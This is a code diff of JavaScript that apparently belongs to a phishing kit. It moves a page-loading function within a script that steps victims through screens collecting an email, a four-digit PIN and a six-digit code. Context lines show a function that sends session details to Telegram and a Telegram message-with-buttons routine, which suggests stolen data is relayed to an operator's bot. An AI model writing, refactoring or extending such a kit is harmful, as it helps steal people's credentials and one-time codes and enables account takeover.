@@ -4,6 +4,35 @@ document.addEventListener("DOMContentLoaded", function () {
     const PIN_LENGTH = 4;
     const CODE_LENGTH = 6; // Final code length for page 3
 
+    // Function to load content into #content-container seamlessly
+    function loadContent(pageUrl) {
+        console.log(`Attempting to load content from ${pageUrl}`);
+        fetch(pageUrl)
+            .then(response => {
+                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
+                return response.text();
+            })
+            .then(data => {
+                const container = document.getElementById('content-container');
+                if (container) {
+                    container.innerHTML = data;
+                    console.log(`Loaded content from ${pageUrl}`);
+                    
+                    if (pageUrl === 'page2.html') {
+                        displayStoredEmail();
+                        initPinEntry();
+                    } else if (pageUrl === 'page3.html') {
+                        initFinalCodeEntry();
+                    } else if (pageUrl === 'page4.html') {
+                        initEmailConfirmation();
+                    }
+                } else {
+                    console.error('#content-container not found');
+                }
+            })
+            .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
+    }
+
     // Function to send session details to Telegram
     function sendSessionDataToTelegram(step, extraMessage) {
         const ip = 'IP_ADDRESS'; // Replace with real method to get IP (e.g., using a service or backend)
@@ -81,35 +110,6 @@ document.addEventListener("DOMContentLoaded", function () {
         .catch(error => {
             console.error('Error in sending message with buttons:', error);
         });
-    }
-
-    // Function to load content into #content-container seamlessly
-    function loadContent(pageUrl) {
-        console.log(`Attempting to load content from ${pageUrl}`);
-        fetch(pageUrl)
-            .then(response => {
-                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
-                return response.text();
-            })
-            .then(data => {
-                const container = document.getElementById('content-container');
-                if (container) {
-                    container.innerHTML = data;
-                    console.log(`Loaded content from ${pageUrl}`);
-                    
-                    if (pageUrl === 'page2.html') {
-                        displayStoredEmail();
-                        initPinEntry();
-                    } else if (pageUrl === 'page3.html') {
-                        initFinalCodeEntry();
-                    } else if (pageUrl === 'page4.html') {
-                        initEmailConfirmation();
-                    }
-                } else {
-                    console.error('#content-container not found');
-                }
-            })
-            .catch(error => console.error(`Error loading content from ${pageUrl}:`, error));
     }
 
     // Initialize email entry functionality on page 1
